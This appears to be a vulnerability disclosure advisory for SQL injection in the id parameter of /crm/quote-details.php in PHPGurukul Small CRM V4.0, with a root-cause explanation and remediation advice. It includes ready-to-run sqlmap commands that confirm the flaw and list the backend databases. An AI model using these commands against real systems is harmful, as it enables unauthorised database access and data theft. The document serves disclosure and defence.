# PHPGurukul Small CRM in PHP V4.0 /crm/quote-details.php SQL Injection

## NAME OF AFFECTED PRODUCT(S)

- Small CRM in PHP

## Vendor Homepage

- https://phpgurukul.com/small-crm-php/

## AFFECTED AND/OR FIXED VERSION(S)

### submitter

- woyom

### VERSION(S)

- V4.0

### Software Link

- https://phpgurukul.com/?sdm_process_download=1&download_id=10412

## PROBLEM TYPE

### Vulnerability Type

- SQL Injection (Error-based, Time-based Blind)

### Root Cause

- In the /crm/quote-details.php file, the id parameter is put directly into the SQL query without cleaning or using prepared statements. Because of this, attackers can add their own SQL code, change the query, and run commands on the database.

<img src="https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/mytyporaimage-20250828142420430.png" alt="image-20250828142420430" style="zoom:50%;" />

### Impact

* Attackers can use this bug to get private database information, change or delete data, increase their privileges, or even stop the system from working. This can cause serious problems for data safety and service stability.

## DESCRIPTION

- While testing *Small CRM in PHP V4.0*, we found a high-risk SQL injection problem in the /crm/quote-details.php page. The issue comes from the id parameter in the GET request, which is used in the SQL query without any check. Because of this, attackers can do error-based, union-based, and time-based blind SQL injection. This makes it possible to leak sensitive information and maybe take over the application.

## Vulnerability Details and Proof of Concept (PoC)

### Vulnerability type:

* SQL Injection (Error-based, Time-based Blind)

### Vulnerability location:

* Parameter: id (GET)

### Proof of Concept Payloads

The problem can be shown using sqlmap:

```
sqlmap -u "http://TARGET-IP/crm/quote-details.php?id=1" --batch
```

Example Results:

![image-20250828150014457](https://woyom-1374329874.cos.ap-nanjing.myqcloud.com/mytyporaimage-20250828150014457.png)

### Attack Demonstration

An attacker can list databases with the following command:

```
sqlmap -u "http://TARGET-IP/crm/quote-details.php?id=1" --batch --dbs
```

Example Result:

The databases from the backend MySQL server are shown.

![image-20250828195557296](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250828195557296.png)

## Suggested Remediation

1. **Use Prepared Statements and Parameterized Queries**: Always use parameterized queries with mysqli or PDO, so user input cannot change SQL commands.
2. **Check and Clean Inputs: **Only accept correct formats (like numbers for id). Block or clean anything else.
3. **Limit Database Permissions: **Do not let the app use accounts with too many rights. Avoid using root.
4. **Do Regular Security Testing:** Review the code and test for bugs often to fix issues before attackers find them.
5. **Update Old Code: **Stop using old mysql_* functions and use mysqli or PDO instead for better security.